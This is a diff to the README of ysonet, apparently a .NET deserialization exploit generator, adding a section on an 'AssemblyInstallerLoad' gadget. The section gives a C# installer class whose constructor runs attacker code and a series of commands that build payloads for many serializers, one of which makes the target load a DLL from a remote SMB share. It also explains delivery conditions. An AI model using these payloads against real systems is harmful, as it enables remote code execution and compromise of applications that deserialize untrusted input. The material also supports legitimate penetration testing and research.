@@ -312,6 +312,77 @@ Four things to know:
   quoted DTD external identifier. Percent-encode anything else. Query strings
   are fine: `&` and `%` are literal there.
 
+### Make the target load your own installer DLL and run it
+
+`AssemblyInstallerLoad` is a bring-your-own-DLL gadget. Setting
+`System.Configuration.Install.AssemblyInstaller.Path` makes the target call
+`Assembly.LoadFrom` on the path you give it, and reading `HelpText` afterwards makes it
+build every public, non-abstract `System.Configuration.Install.Installer` subclass in
+that assembly that is marked `[RunInstaller(true)]`. Your installer's CONSTRUCTOR is
+what runs. ysonet never produces the DLL.
+
+Your DLL needs a class like this, and nothing else:
+
+```csharp
+using System.ComponentModel;
+using System.Configuration.Install;
+
+[RunInstaller(true)]
+public class Boom : Installer
+{
+    public Boom() { /* your code here */ }
+}
+```
+
+```bash
+# variant 1: a path the target can already open
+./ysonet.exe -g AssemblyInstallerLoad -f Json.NET -c "C:\programdata\installer.dll"
+
+# variant 2: the target fetches it from your share over SMB
+./ysonet.exe -g AssemblyInstallerLoad -f Json.NET --variant 2 -c "\\10.0.0.5\share\installer.dll"
+
+# the other formatters (PropertyGrid carrier only)
+./ysonet.exe -g AssemblyInstallerLoad -f Xaml -c "C:\programdata\installer.dll"
+./ysonet.exe -g AssemblyInstallerLoad -f FastJson -c "C:\programdata\installer.dll"
+./ysonet.exe -g AssemblyInstallerLoad -f JavaScriptSerializer -c "C:\programdata\installer.dll"
+./ysonet.exe -g AssemblyInstallerLoad -f YamlDotNet -c "C:\programdata\installer.dll"
+./ysonet.exe -g AssemblyInstallerLoad -f SharpSerializerXml -c "C:\programdata\installer.dll"
+./ysonet.exe -g AssemblyInstallerLoad -f SharpSerializerBinary -c "C:\programdata\installer.dll"
+./ysonet.exe -g AssemblyInstallerLoad -f MessagePackTypeless -c "C:\programdata\installer.dll"
+
+# a different getter carrier (Json.NET and Xaml only)
+./ysonet.exe -g AssemblyInstallerLoad -f Xaml --getter 3 -c "C:\programdata\installer.dll"
+```
+
+Things to know:
+
+- `-t` IS REFUSED, on purpose. A self-test deserializes the payload in the ysonet
+  process, which would load your DLL and run its installer constructors on YOUR
+  machine. Generate without `-t` and deliver the payload to the target.
+- Without a `[RunInstaller(true)]` installer class, the payload is only an assembly
+  load. That is still useful (a module initializer or a static constructor may run),
+  but it is not the same thing.
+- `-c` must be a PATH to a `.dll` or a managed `.exe`. A bare program name such as
+  `calc.exe` is refused, because it would be resolved against whatever directory the
+  target process happens to be in.
+- UNC delivery is configuration dependent. .NET only loads an assembly from a share
+  it classifies as Local Intranet; a share reached by a bare IP is Internet zone and
+  the load fails with `0x80131515` unless the target sets `loadFromRemoteSources=true`.
+  The target must also be able to reach the share at all: SMB egress, share
+  permissions, and Mark-of-the-Web all apply. A DNS or SMB callback proves the target
+  TRIED, not that it loaded the assembly.
+- `--getter` picks the WinForms carrier that reads `HelpText`. Only Json.NET and Xaml
+  can build the ComboBox, ListBox and CheckedListBox carriers, because those expose
+  `Items` without a setter; every other formatter uses `--getter 1` (PropertyGrid).
+  ComboBox reads `HelpText` more than once, but your installer is still constructed
+  only once: `AssemblyInstaller` sets a private `initialized` flag after the first read.
+- Not the same gadget as `XamlAssemblyLoadFromFile`, which takes C# SOURCE, compiles it
+  while building and embeds the assembly in the payload (and needs WPF on the target).
+  This one takes a path to an assembly you already have, and can deliver it over SMB.
+- If `--minify` would rewrite your path (the YAML minifier collapses repeated spaces,
+  the XML one collapses `"; "`), generation is refused rather than shipping a payload
+  that names a different file. Drop `--minify` or use a simpler path.
+
 ### Generate a minified BinaryFormatter payload for Exchange CVE-2021-42321
 
 Uses the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.
